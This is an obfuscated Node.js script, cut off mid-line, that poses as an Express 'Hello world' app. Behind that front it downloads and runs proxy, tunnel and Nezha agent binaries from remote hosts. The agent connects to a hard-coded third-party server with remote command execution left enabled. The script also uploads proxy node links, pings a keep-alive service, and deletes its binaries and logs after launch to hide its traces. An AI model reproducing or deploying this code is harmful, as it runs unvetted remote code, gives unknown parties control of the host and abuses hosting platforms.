const _0x310a77=_0x2bd8;(function(_0x146db3,_0x9a09ca){const _0x5be0b4=_0x2bd8,_0x134381=_0x146db3();while(!![]){try{const _0x36b924=-parseInt(_0x5be0b4(0x261))/0x1*(-parseInt(_0x5be0b4(0x292))/0x2)+parseInt(_0x5be0b4(0x27e))/0x3+parseInt(_0x5be0b4(0x1f8))/0x4*(parseInt(_0x5be0b4(0x297))/0x5)+-parseInt(_0x5be0b4(0x26a))/0x6+parseInt(_0x5be0b4(0x285))/0x7+-parseInt(_0x5be0b4(0x23e))/0x8*(-parseInt(_0x5be0b4(0x279))/0x9)+-parseInt(_0x5be0b4(0x28e))/0xa*(parseInt(_0x5be0b4(0x286))/0xb);if(_0x36b924===_0x9a09ca)break;else _0x134381['push'](_0x134381['shift']());}catch(_0x42298d){_0x134381['push'](_0x134381['shift']());}}}(_0x3af4,0x8b19e));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x310a77(0x277)),exec=promisify(require(_0x310a77(0x265))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x310a77(0x237)]||'',PROJECT_URL=process['env'][_0x310a77(0x240)]||'',AUTO_ACCESS=process[_0x310a77(0x221)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x310a77(0x221)][_0x310a77(0x27c)]||_0x310a77(0x23a),SUB_PATH=process[_0x310a77(0x221)]['SUB_PATH']||_0x310a77(0x268),PORT=process[_0x310a77(0x221)][_0x310a77(0x21d)]||process[_0x310a77(0x221)][_0x310a77(0x22d)]||0xbb8,UUID=process[_0x310a77(0x221)][_0x310a77(0x20f)]||_0x310a77(0x29e),NEZHA_SERVER=process[_0x310a77(0x221)]['NEZHA_SERVER']||'nz.rongshishang.dpdns.org:8008',NEZHA_PORT=process[_0x310a77(0x221)][_0x310a77(0x298)]||'',NEZHA_KEY=process['env'][_0x310a77(0x283)]||_0x310a77(0x211),ARGO_DOMAIN=process[_0x310a77(0x221)][_0x310a77(0x27d)]||_0x310a77(0x270),ARGO_AUTH=process[_0x310a77(0x221)][_0x310a77(0x254)]||'eyJhIjoiZGU0ZjU3OTllY2VmNzE0OWY0NmFiMWNlMjMwOTkyMmEiLCJ0IjoiZGMxYzRlZjItMmEyOS00YTg5LTg5ZWEtZTM2ZDU2ODQxZmU1IiwicyI6Ik5HUTNNekV5T1dZdE1qYzVPUzAwWVRWakxXRXhNR1V0WldKa09ERm1OelV5WWpNeSJ9',ARGO_PORT=process[_0x310a77(0x221)][_0x310a77(0x1fa)]||0x1f41,CFIP=process[_0x310a77(0x221)][_0x310a77(0x251)]||_0x310a77(0x209),CFPORT=process[_0x310a77(0x221)][_0x310a77(0x2ad)]||0x1bb,NAME=process[_0x310a77(0x221)][_0x310a77(0x234)]||_0x310a77(0x264);!fs[_0x310a77(0x276)](FILE_PATH)?(fs[_0x310a77(0x248)](FILE_PATH),console[_0x310a77(0x259)](FILE_PATH+_0x310a77(0x252))):console[_0x310a77(0x259)](FILE_PATH+_0x310a77(0x28b));function generateRandomName(){const _0x3073bb=_0x310a77,_0x5755ac=_0x3073bb(0x287);let _0x2b6188='';for(let _0x5005d4=0x0;_0x5005d4<0x6;_0x5005d4++){_0x2b6188+=_0x5755ac[_0x3073bb(0x246)](Math[_0x3073bb(0x28c)](Math['random']()*_0x5755ac[_0x3073bb(0x22c)]));}return _0x2b6188;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x310a77(0x21a)](FILE_PATH,npmName),phpPath=path[_0x310a77(0x21a)](FILE_PATH,phpName),webPath=path[_0x310a77(0x21a)](FILE_PATH,webName),botPath=path[_0x310a77(0x21a)](FILE_PATH,botName),subPath=path[_0x310a77(0x21a)](FILE_PATH,_0x310a77(0x208)),listPath=path[_0x310a77(0x21a)](FILE_PATH,_0x310a77(0x2af)),bootLogPath=path[_0x310a77(0x21a)](FILE_PATH,_0x310a77(0x217)),configPath=path[_0x310a77(0x21a)](FILE_PATH,_0x310a77(0x27a));function deleteNodes(){const _0xa97305=_0x310a77;try{if(!UPLOAD_URL)return;if(!fs[_0xa97305(0x276)](subPath))return;let _0x288428;try{_0x288428=fs[_0xa97305(0x288)](subPath,_0xa97305(0x20a));}catch{return null;}const _0x333e2a=Buffer['from'](_0x288428,_0xa97305(0x267))[_0xa97305(0x275)](_0xa97305(0x20a)),_0x588a0b=_0x333e2a[_0xa97305(0x20e)]('\x0a')['filter'](_0xd68ee6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa97305(0x2a5)](_0xd68ee6));if(_0x588a0b[_0xa97305(0x22c)]===0x0)return;return axios[_0xa97305(0x1fc)](UPLOAD_URL+_0xa97305(0x25c),JSON[_0xa97305(0x235)]({'nodes':_0x588a0b}),{'headers':{'Content-Type':_0xa97305(0x272)}})[_0xa97305(0x280)](_0x5bd4f6=>{return null;}),null;}catch(_0x197a9b){return null;}}function cleanupOldFiles(){const _0x3bd605=_0x310a77;try{const _0x8f95bb=fs[_0x3bd605(0x238)](FILE_PATH);_0x8f95bb['forEach'](_0xfce186=>{const _0x286c=_0x3bd605,_0x2a22e1=path[_0x286c(0x21a)](FILE_PATH,_0xfce186);try{const _0x1a3e21=fs['statSync'](_0x2a22e1);_0x1a3e21[_0x286c(0x23d)]()&&fs['unlinkSync'](_0x2a22e1);}catch(_0x334b06){}});}catch(_0x147dae){}}app[_0x310a77(0x21c)]('/',function(_0x4d0976,_0x182663){const _0x56d447=_0x310a77;_0x182663[_0x56d447(0x21f)]('Hello\x20world!');});async function generateConfig(){const _0x408d53=_0x310a77,_0x4168a8={'log':{'access':_0x408d53(0x207),'error':'/dev/null','loglevel':_0x408d53(0x291)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x408d53(0x21e),'settings':{'clients':[{'id':UUID,'flow':_0x408d53(0x2a1)}],'decryption':_0x408d53(0x291),'fallbacks':[{'dest':0xbb9},{'path':_0x408d53(0x26c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x408d53(0x24c),'dest':0xbbc}]},'streamSettings':{'network':_0x408d53(0x220)}},{'port':0xbb9,'listen':_0x408d53(0x274),'protocol':_0x408d53(0x21e),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x408d53(0x274),'protocol':_0x408d53(0x21e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x408d53(0x291)},'streamSettings':{'network':'ws','security':_0x408d53(0x291),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x408d53(0x2a0),_0x408d53(0x216),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x408d53(0x294),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x408d53(0x28a)}},'sniffing':{'enabled':!![],'destOverride':[_0x408d53(0x2a0),_0x408d53(0x216),_0x408d53(0x24a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x408d53(0x274),'protocol':_0x408d53(0x2b0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x408d53(0x24c)}},'sniffing':{'enabled':!![],'destOverride':[_0x408d53(0x2a0),_0x408d53(0x216),_0x408d53(0x24a)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x408d53(0x253)}]};fs[_0x408d53(0x224)](path[_0x408d53(0x21a)](FILE_PATH,_0x408d53(0x27a)),JSON[_0x408d53(0x235)](_0x4168a8,null,0x2));}function getSystemArchitecture(){const _0x2972a6=_0x310a77,_0x1dee01=os[_0x2972a6(0x24b)]();return _0x1dee01===_0x2972a6(0x2a4)||_0x1dee01==='arm64'||_0x1dee01==='aarch64'?'arm':_0x2972a6(0x25d);}function downloadFile(_0x559adb,_0x3aa79e,_0x315c3b){const _0x1fdd4e=_0x310a77,_0x4c2085=_0x559adb;!fs[_0x1fdd4e(0x276)](FILE_PATH)&&fs[_0x1fdd4e(0x248)](FILE_PATH,{'recursive':!![]});const _0x32d884=fs[_0x1fdd4e(0x282)](_0x4c2085);axios({'method':_0x1fdd4e(0x21c),'url':_0x3aa79e,'responseType':_0x1fdd4e(0x26d)})['then'](_0x5e6b7f=>{const _0xb3c6ed=_0x1fdd4e;_0x5e6b7f[_0xb3c6ed(0x22f)][_0xb3c6ed(0x206)](_0x32d884),_0x32d884['on'](_0xb3c6ed(0x281),()=>{const _0x17ed7e=_0xb3c6ed;_0x32d884[_0x17ed7e(0x23f)](),console[_0x17ed7e(0x259)](_0x17ed7e(0x1f5)+path['basename'](_0x4c2085)+_0x17ed7e(0x273)),_0x315c3b(null,_0x4c2085);}),_0x32d884['on']('error',_0x5f5b97=>{const _0x24b9da=_0xb3c6ed;fs[_0x24b9da(0x23c)](_0x4c2085,()=>{});const _0x2134fb=_0x24b9da(0x1f5)+path[_0x24b9da(0x27b)](_0x4c2085)+'\x20failed:\x20'+_0x5f5b97[_0x24b9da(0x250)];console[_0x24b9da(0x21b)](_0x2134fb),_0x315c3b(_0x2134fb);});})[_0x1fdd4e(0x280)](_0x9c72a3=>{const _0x10ba5f=_0x1fdd4e,_0x140465=_0x10ba5f(0x1f5)+path[_0x10ba5f(0x27b)](_0x4c2085)+_0x10ba5f(0x22b)+_0x9c72a3[_0x10ba5f(0x250)];console[_0x10ba5f(0x21b)](_0x140465),_0x315c3b(_0x140465);});}async function downloadFilesAndRun(){const _0x553d1f=_0x310a77,_0x3500dc=getSystemArchitecture(),_0x21aa88=getFilesForArchitecture(_0x3500dc);if(_0x21aa88['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x58de7b=_0x21aa88[_0x553d1f(0x257)](_0x49400c=>{return new Promise((_0x5bb4ee,_0x1c9991)=>{const _0x4a457c=_0x2bd8;downloadFile(_0x49400c['fileName'],_0x49400c[_0x4a457c(0x227)],(_0x12a62d,_0x5f2d5f)=>{_0x12a62d?_0x1c9991(_0x12a62d):_0x5bb4ee(_0x5f2d5f);});});});try{await Promise[_0x553d1f(0x29b)](_0x58de7b);}catch(_0x3aeb67){console[_0x553d1f(0x21b)](_0x553d1f(0x25b),_0x3aeb67);return;}function _0x8e594f(_0x248c70){const _0x23fe66=_0x553d1f,_0x18f2d0=0x1fd;_0x248c70[_0x23fe66(0x271)](_0x184466=>{const _0x363350=_0x23fe66;fs[_0x363350(0x276)](_0x184466)&&fs['chmod'](_0x184466,_0x18f2d0,_0x111b04=>{const _0x5f249e=_0x363350;_0x111b04?console[_0x5f249e(0x21b)](_0x5f249e(0x26e)+_0x184466+':\x20'+_0x111b04):console['log'](_0x5f249e(0x2a6)+_0x184466+':\x20'+_0x18f2d0[_0x5f249e(0x275)](0x8));});});}const _0x52933a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x8e594f(_0x52933a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x55843a=NEZHA_SERVER[_0x553d1f(0x25e)](':')?NEZHA_SERVER[_0x553d1f(0x20e)](':')['pop']():'',_0x25a177=new Set(['443','8443',_0x553d1f(0x229),_0x553d1f(0x2ae),_0x553d1f(0x203),_0x553d1f(0x290)]),_0x3461f5=_0x25a177[_0x553d1f(0x256)](_0x55843a)?_0x553d1f(0x213):'false',_0x57c626=_0x553d1f(0x247)+NEZHA_KEY+_0x553d1f(0x2ac)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3461f5+_0x553d1f(0x219)+UUID;fs['writeFileSync'](path[_0x553d1f(0x21a)](FILE_PATH,'config.yaml'),_0x57c626);const _0x48c334=_0x553d1f(0x23b)+phpPath+_0x553d1f(0x231)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x48c334),console['log'](phpName+_0x553d1f(0x28f)),await new Promise(_0x1a9ee5=>setTimeout(_0x1a9ee5,0x3e8));}catch(_0x10b675){console[_0x553d1f(0x21b)]('php\x20running\x20error:\x20'+_0x10b675);}}else{let _0x145e5e='';const _0x22bb43=['443',_0x553d1f(0x233),_0x553d1f(0x229),_0x553d1f(0x2ae),'2083',_0x553d1f(0x290)];_0x22bb43[_0x553d1f(0x25e)](NEZHA_PORT)&&(_0x145e5e=_0x553d1f(0x222));const _0x2bdba6=_0x553d1f(0x23b)+npmPath+_0x553d1f(0x1fd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x553d1f(0x236)+NEZHA_KEY+'\x20'+_0x145e5e+_0x553d1f(0x29a);try{await exec(_0x2bdba6),console['log'](npmName+_0x553d1f(0x28f)),await new Promise(_0x4e311d=>setTimeout(_0x4e311d,0x3e8));}catch(_0x2d8117){console[_0x553d1f(0x21b)](_0x553d1f(0x243)+_0x2d8117);}}}else console[_0x553d1f(0x259)](_0x553d1f(0x245));const _0x37c3ab=_0x553d1f(0x23b)+webPath+'\x20-c\x20'+FILE_PATH+_0x553d1f(0x215);try{await exec(_0x37c3ab),console[_0x553d1f(0x259)](webName+_0x553d1f(0x28f)),await new Promise(_0x45ae5b=>setTimeout(_0x45ae5b,0x3e8));}catch(_0x43bb15){console['error'](_0x553d1f(0x29d)+_0x43bb15);}if(fs[_0x553d1f(0x276)](botPath)){let _0x1e2810;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1e2810='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1e2810=_0x553d1f(0x2a3)+FILE_PATH+_0x553d1f(0x230):_0x1e2810=_0x553d1f(0x2a8)+FILE_PATH+_0x553d1f(0x200)+ARGO_PORT;try{await exec(_0x553d1f(0x23b)+botPath+'\x20'+_0x1e2810+_0x553d1f(0x210)),console[_0x553d1f(0x259)](botName+_0x553d1f(0x28f)),await new Promise(_0x174f26=>setTimeout(_0x174f26,0x7d0));}catch(_0x8ca410){console[_0x553d1f(0x21b)](_0x553d1f(0x28d)+_0x8ca410);}}await new Promise(_0x47d36b=>setTimeout(_0x47d36b,0x1388));}function getFilesForArchitecture(_0x2c005e){const _0x2b05d1=_0x310a77;let _0x3268ae;_0x2c005e==='arm'?_0x3268ae=[{'fileName':webPath,'fileUrl':_0x2b05d1(0x1f4)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3268ae=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2b05d1(0x1fe)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x31b41c=_0x2c005e==='arm'?_0x2b05d1(0x24e):_0x2b05d1(0x24f);_0x3268ae[_0x2b05d1(0x242)]({'fileName':npmPath,'fileUrl':_0x31b41c});}else{const _0x233fce=_0x2c005e==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x2b05d1(0x1f3);_0x3268ae['unshift']({'fileName':phpPath,'fileUrl':_0x233fce});}}return _0x3268ae;}function argoType(){const _0x479bc0=_0x310a77;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x479bc0(0x259)](_0x479bc0(0x269));return;}if(ARGO_AUTH[_0x479bc0(0x25e)](_0x479bc0(0x22a))){fs[_0x479bc0(0x224)](path[_0x479bc0(0x21a)](FILE_PATH,_0x479bc0(0x29c)),ARGO_AUTH);const _0x45b665=_0x479bc0(0x249)+ARGO_AUTH[_0x479bc0(0x20e)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x479bc0(0x21a)](FILE_PATH,_0x479bc0(0x29c))+_0x479bc0(0x1fb)+ARGO_DOMAIN+_0x479bc0(0x295)+ARGO_PORT+_0x479bc0(0x263);fs[_0x479bc0(0x224)](path[_0x479bc0(0x21a)](FILE_PATH,'tunnel.yml'),_0x45b665);}else console[_0x479bc0(0x259)](_0x479bc0(0x299));}function _0x2bd8(_0xbce3d4,_0x1dae20){_0xbce3d4=_0xbce3d4-0x1f2;const _0x3af44c=_0x3af4();let _0x2bd83a=_0x3af44c[_0xbce3d4];return _0x2bd83a;}function _0x3af4(){const _0x20f8e5=['toString','existsSync','util','/api/add-nodes','10611VJvxpQ','config.json','basename','FILE_PATH','ARGO_DOMAIN','383487lLAopw','Error\x20in\x20startserver:','catch','finish','createWriteStream','NEZHA_KEY','https://ipapi.co/json/','7504490XJtXkm','11DsUBqQ','abcdefghijklmnopqrstuvwxyz','readFileSync','rm\x20-rf\x20','/vmess-argo','\x20already\x20exists','floor','Error\x20executing\x20command:\x20','16583090EFinLb','\x20is\x20running','2053','none','16222vwIscn','https://oooo.serv00.net/add-url','vmess','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','filter','3348695vJYDtP','NEZHA_PORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','all','tunnel.json','web\x20running\x20error:\x20','868e648a-b290-4959-b48a-7cb1bdb44a49','&path=%2Fvless-argo%3Fed%3D2560#','http','xtls-rprx-vision','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','arm','test','Empowerment\x20success\x20for\x20','substring','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','win32','App\x20is\x20running','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','CFPORT','2087','list.txt','trojan','?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/web','Download\x20','countryCode','Subscription\x20uploaded\x20successfully','4wYdQvs','\x0avless://','ARGO_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','post','\x20-s\x20','https://amd64.ssss.nyc.mn/bot','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','platform','.exe\x20>\x20nul\x202>&1','2083','success','country_code','pipe','/dev/null','sub.txt','cdns.doon.eu.org','utf-8','Error\x20reading\x20boot.log:','automatic\x20access\x20task\x20added\x20successfully','clear','split','UUID','\x20>/dev/null\x202>&1\x20&','1BlOWB7RfxWl4LbWdfSpW1MRJoqivG9G','firefox','true','Skipping\x20adding\x20automatic\x20access\x20task','/config.json\x20>/dev/null\x202>&1\x20&','tls','boot.log','taskkill\x20/f\x20/im\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','join','error','get','SERVER_PORT','vless','send','tcp','env','--tls','Unknown','writeFileSync','del\x20/f\x20/q\x20','text/plain;\x20charset=utf-8','fileUrl','response','2096','TunnelSecret','\x20failed:\x20','length','PORT','?security=tls&sni=','data','/tunnel.yml\x20run','\x20-c\x20\x22','\x0a\x0avmess://','8443','NAME','stringify','\x20-p\x20','UPLOAD_URL','readdirSync','&fp=firefox&type=ws&host=','./tmp','nohup\x20','unlink','isFile','1592VsRFpI','close','PROJECT_URL','http://ip-api.com/json/','unshift','npm\x20running\x20error:\x20','\x20>\x20nul\x202>&1','NEZHA\x20variable\x20is\x20empty,skip\x20running','charAt','\x0aclient_secret:\x20','mkdirSync','\x0a\x20\x20tunnel:\x20','quic','arch','/trojan-argo','\x22\x20>\x20/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/agent','message','CFIP','\x20is\x20created','block','ARGO_AUTH','/vmess-argo?ed=2560','has','map','/sub.txt\x20saved\x20successfully','log','ARGO_DOMAIN:','Error\x20downloading\x20files:','/api/delete-nodes','amd','includes','status','ArgoDomain:','111kCECVg','\x0a\x0atrojan://','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tangqin373','child_process','org','base64','sub','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','4659078rdyTZq','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/vless-argo','stream','Empowerment\x20failed\x20for\x20','push','zzip.tangqin3.dpdns.org','forEach','application/json','\x20successfully','127.0.0.1'];_0x3af4=function(){return _0x20f8e5;};return _0x3af4();}async function extractDomains(){const _0x5cedd1=_0x310a77;let _0x370de5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x370de5=ARGO_DOMAIN,console[_0x5cedd1(0x259)](_0x5cedd1(0x25a),_0x370de5),await _0x3f483d(_0x370de5);else try{const _0x504a3f=fs[_0x5cedd1(0x288)](path[_0x5cedd1(0x21a)](FILE_PATH,_0x5cedd1(0x217)),_0x5cedd1(0x20a)),_0x44baa6=_0x504a3f[_0x5cedd1(0x20e)]('\x0a'),_0x4e00c2=[];_0x44baa6['forEach'](_0x574997=>{const _0x5952e6=_0x5cedd1,_0x25e7de=_0x574997['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25e7de){const _0x4d3feb=_0x25e7de[0x1];_0x4e00c2[_0x5952e6(0x26f)](_0x4d3feb);}});if(_0x4e00c2[_0x5cedd1(0x22c)]>0x0)_0x370de5=_0x4e00c2[0x0],console[_0x5cedd1(0x259)](_0x5cedd1(0x260),_0x370de5),await _0x3f483d(_0x370de5);else{console[_0x5cedd1(0x259)](_0x5cedd1(0x26b)),fs['unlinkSync'](path[_0x5cedd1(0x21a)](FILE_PATH,'boot.log'));async function _0x10b32d(){const _0x3d2b99=_0x5cedd1;try{process[_0x3d2b99(0x201)]===_0x3d2b99(0x2a9)?await exec(_0x3d2b99(0x218)+botName+_0x3d2b99(0x202)):await exec('pkill\x20-f\x20\x22['+botName[_0x3d2b99(0x246)](0x0)+']'+botName[_0x3d2b99(0x2a7)](0x1)+_0x3d2b99(0x24d));}catch(_0xa0c794){}}_0x10b32d(),await new Promise(_0xc9ed09=>setTimeout(_0xc9ed09,0xbb8));const _0x3e5c3b=_0x5cedd1(0x2a8)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5cedd1(0x23b)+botPath+'\x20'+_0x3e5c3b+_0x5cedd1(0x210)),console[_0x5cedd1(0x259)](botName+_0x5cedd1(0x28f)),await new Promise(_0x4ad8a1=>setTimeout(_0x4ad8a1,0xbb8)),await extractDomains();}catch(_0x29eaf8){console[_0x5cedd1(0x21b)](_0x5cedd1(0x28d)+_0x29eaf8);}}}catch(_0x5a4b03){console[_0x5cedd1(0x21b)](_0x5cedd1(0x20b),_0x5a4b03);}async function _0x190f2d(){const _0x33ba34=_0x5cedd1;try{const _0x29d5cd=await axios[_0x33ba34(0x21c)](_0x33ba34(0x284),{'timeout':0xbb8});if(_0x29d5cd[_0x33ba34(0x22f)]&&_0x29d5cd[_0x33ba34(0x22f)]['country_code']&&_0x29d5cd[_0x33ba34(0x22f)][_0x33ba34(0x266)])return _0x29d5cd[_0x33ba34(0x22f)][_0x33ba34(0x205)]+'_'+_0x29d5cd['data'][_0x33ba34(0x266)];}catch(_0xc9303a){try{const _0x23800a=await axios[_0x33ba34(0x21c)](_0x33ba34(0x241),{'timeout':0xbb8});if(_0x23800a[_0x33ba34(0x22f)]&&_0x23800a[_0x33ba34(0x22f)][_0x33ba34(0x25f)]===_0x33ba34(0x204)&&_0x23800a[_0x33ba34(0x22f)][_0x33ba34(0x1f6)]&&_0x23800a[_0x33ba34(0x22f)][_0x33ba34(0x266)])return _0x23800a[_0x33ba34(0x22f)][_0x33ba34(0x1f6)]+'_'+_0x23800a[_0x33ba34(0x22f)][_0x33ba34(0x266)];}catch(_0x4ddbbd){}}return _0x33ba34(0x223);}async function _0x3f483d(_0x1fc6e6){const _0x4b892b=await _0x190f2d(),_0x54a53e=NAME?NAME+'-'+_0x4b892b:_0x4b892b;return new Promise(_0x115645=>{setTimeout(()=>{const _0x4afe79=_0x2bd8,_0xf67a57={'v':'2','ps':''+_0x54a53e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4afe79(0x291),'net':'ws','type':_0x4afe79(0x291),'host':_0x1fc6e6,'path':_0x4afe79(0x255),'tls':_0x4afe79(0x216),'sni':_0x1fc6e6,'alpn':'','fp':_0x4afe79(0x212)},_0x1e12fd=_0x4afe79(0x1f9)+UUID+'@'+CFIP+':'+CFPORT+_0x4afe79(0x1f2)+_0x1fc6e6+_0x4afe79(0x239)+_0x1fc6e6+_0x4afe79(0x29f)+_0x54a53e+_0x4afe79(0x232)+Buffer[_0x4afe79(0x2a2)](JSON[_0x4afe79(0x235)](_0xf67a57))[_0x4afe79(0x275)](_0x4afe79(0x267))+_0x4afe79(0x262)+UUID+'@'+CFIP+':'+CFPORT+_0x4afe79(0x22e)+_0x1fc6e6+_0x4afe79(0x239)+_0x1fc6e6+_0x4afe79(0x2ab)+_0x54a53e+'\x0a\x20\x20\x20\x20';console[_0x4afe79(0x259)](Buffer[_0x4afe79(0x2a2)](_0x1e12fd)[_0x4afe79(0x275)](_0x4afe79(0x267))),fs[_0x4afe79(0x224)](subPath,Buffer[_0x4afe79(0x2a2)](_0x1e12fd)[_0x4afe79(0x275)]('base64')),console[_0x4afe79(0x259)](FILE_PATH+_0x4afe79(0x258)),uploadNodes(),app[_0x4afe79(0x21c)]('/'+SUB_PATH,(_0x5d77ae,_0x5b2109)=>{const _0x24de85=_0x4afe79,_0x4da358=Buffer[_0x24de85(0x2a2)](_0x1e12fd)[_0x24de85(0x275)]('base64');_0x5b2109['set']('Content-Type',_0x24de85(0x226)),_0x5b2109['send'](_0x4da358);}),_0x115645(_0x1e12fd);},0x7d0);});}}async function uploadNodes(){const _0x2db445=_0x310a77;if(UPLOAD_URL&&PROJECT_URL){const _0x525652=PROJECT_URL+'/'+SUB_PATH,_0x54bcb0={'subscription':[_0x525652]};try{const _0x25900d=await axios[_0x2db445(0x1fc)](UPLOAD_URL+'/api/add-subscriptions',_0x54bcb0,{'headers':{'Content-Type':_0x2db445(0x272)}});return _0x25900d&&_0x25900d[_0x2db445(0x25f)]===0xc8?(console[_0x2db445(0x259)](_0x2db445(0x1f7)),_0x25900d):null;}catch(_0x5832d4){if(_0x5832d4[_0x2db445(0x228)]){if(_0x5832d4[_0x2db445(0x228)][_0x2db445(0x25f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2db445(0x276)](listPath))return;const _0x27622d=fs['readFileSync'](listPath,_0x2db445(0x20a)),_0x5d0154=_0x27622d['split']('\x0a')[_0x2db445(0x296)](_0x4e6cb2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2db445(0x2a5)](_0x4e6cb2));if(_0x5d0154[_0x2db445(0x22c)]===0x0)return;const _0xc1e90e=JSON[_0x2db445(0x235)]({'nodes':_0x5d0154});try{const _0x217f65=await axios[_0x2db445(0x1fc)](UPLOAD_URL+_0x2db445(0x278),_0xc1e90e,{'headers':{'Content-Type':_0x2db445(0x272)}});return _0x217f65&&_0x217f65[_0x2db445(0x25f)]===0xc8?(console[_0x2db445(0x259)]('Nodes\x20uploaded\x20successfully'),_0x217f65):null;}catch(_0x401c30){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x507bd6=_0x2bd8,_0x3d7630=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3d7630['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3d7630[_0x507bd6(0x26f)](phpPath);process['platform']===_0x507bd6(0x2a9)?exec(_0x507bd6(0x225)+_0x3d7630['join']('\x20')+_0x507bd6(0x244),_0x490075=>{const _0x5443f6=_0x507bd6;console[_0x5443f6(0x20d)](),console[_0x5443f6(0x259)](_0x5443f6(0x2aa)),console[_0x5443f6(0x259)](_0x5443f6(0x1ff));}):exec(_0x507bd6(0x289)+_0x3d7630[_0x507bd6(0x21a)]('\x20')+'\x20>/dev/null\x202>&1',_0x4b66f8=>{const _0x5ba801=_0x507bd6;console[_0x5ba801(0x20d)](),console[_0x5ba801(0x259)](_0x5ba801(0x2aa)),console[_0x5ba801(0x259)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xf89be4=_0x310a77;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xf89be4(0x214));return;}try{const _0x912446=await axios[_0xf89be4(0x1fc)](_0xf89be4(0x293),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xf89be4(0x272)}});return console[_0xf89be4(0x259)](_0xf89be4(0x20c)),_0x912446;}catch(_0x2807a7){return console[_0xf89be4(0x21b)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2807a7['message']),null;}}async function startserver(){const _0x5341be=_0x310a77;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 